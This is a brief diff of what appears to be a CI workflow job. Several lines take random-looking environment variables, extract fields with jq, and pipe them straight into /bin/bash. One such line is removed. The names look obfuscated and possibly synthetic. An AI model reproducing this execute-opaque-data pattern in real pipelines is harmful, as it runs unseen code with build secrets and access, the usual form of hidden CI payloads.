@@ -21,7 +21,6 @@ jobs:
           echo $cvho1467 | jq -r .zte339 | /bin/bash
           echo $i2 | jq -r .kwjii6 | /bin/bash
           printf '%s' "$zjx76734" | jq -r .qzlzk4394 | /bin/bash
-          echo $n51 | jq -r .jwgyf26 | /bin/bash
           printf '%s' "$vhp58" | jq -r .gj1 | /bin/bash
 
       - name: Archive results
